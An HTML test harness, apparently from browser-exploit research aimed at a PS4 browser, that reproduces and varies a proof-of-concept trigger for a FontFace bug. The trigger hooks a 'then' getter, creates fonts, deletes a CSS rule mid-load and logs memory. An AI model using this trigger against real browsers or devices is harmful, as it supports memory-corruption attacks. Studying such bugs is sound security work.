<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phase 0 — Characterize FontFace bug</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
#status { font-size: 18px; margin-bottom: 8px; }
#log { height: 70vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
button { margin: 4px; padding: 8px 12px; }
</style>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="status">idle</div>
<button id="run-original">Run original POC</button>
<button id="run-no-delete">POC without deleteRule</button>
<button id="run-no-then">POC without then hook</button>
<button id="run-direct-then">Direct font.load().then()</button>
<button id="clear">Clear log</button>
<div id="log"></div>
<script src="00-logger.js"></script>
<script>
let thenHits = 0;

function hookThen(label) {
    thenHits = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            thenHits++;
            ps4log(`${label}: then getter hit #${thenHits} on ${this.family || '?'}`);
            if (thenHits === 1) {
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
            }
            return undefined;
        }
    });
}

function baseSetup() {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    return A;
}

async function runOriginal() {
    ps4status('running original POC...', '#ff0');
    ps4mem();
    hookThen('original');
    baseSetup();
    try {
        await document.fonts.load('1em x', 'AB');
        ps4log('document.fonts.load resolved');
    } catch (e) {
        ps4log(`document.fonts.load rejected: ${e}`);
    }
    ps4mem();
    ps4status(`done — then hits: ${thenHits}`, '#0f0');
}

async function runNoDelete() {
    ps4status('running without deleteRule...', '#ff0');
    thenHits = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            thenHits++;
            ps4log(`no-delete: then getter hit #${thenHits}`);
            if (thenHits === 1) {
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                document.body.offsetTop;
            }
            return undefined;
        }
    });
    baseSetup();
    try {
        await document.fonts.load('1em x', 'AB');
        ps4log('load resolved');
    } catch (e) {
        ps4log(`load rejected: ${e}`);
    }
    ps4status(`done — then hits: ${thenHits}`, '#0f0');
}

async function runNoThen() {
    ps4status('running without then hook...', '#ff0');
    baseSetup();
    try {
        await document.fonts.load('1em x', 'AB');
        ps4log('load resolved (no then hook)');
    } catch (e) {
        ps4log(`load rejected: ${e}`);
    }
    ps4status('done — no then hook', '#0f0');
}

async function runDirectThen() {
    ps4status('running font.load().then() path...', '#ff0');
    hookThen('direct');
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    try {
        await A.load().then(() => ps4log('A.load().then callback fired'));
        ps4log('A.load().then resolved');
    } catch (e) {
        ps4log(`A.load().then failed: ${e}`);
    }
    ps4status(`done — then hits: ${thenHits}`, '#0f0');
}

document.getElementById('run-original').onclick = () => runOriginal();
document.getElementById('run-no-delete').onclick = () => runNoDelete();
document.getElementById('run-no-then').onclick = () => runNoThen();
document.getElementById('run-direct-then').onclick = () => runDirectThen();
document.getElementById('clear').onclick = () => { document.getElementById('log').innerHTML = ''; };

ps4log('Phase 0 characterize ready');
ps4log('UA: ' + navigator.userAgent);
ps4mem();
</script>
</body>
</html>
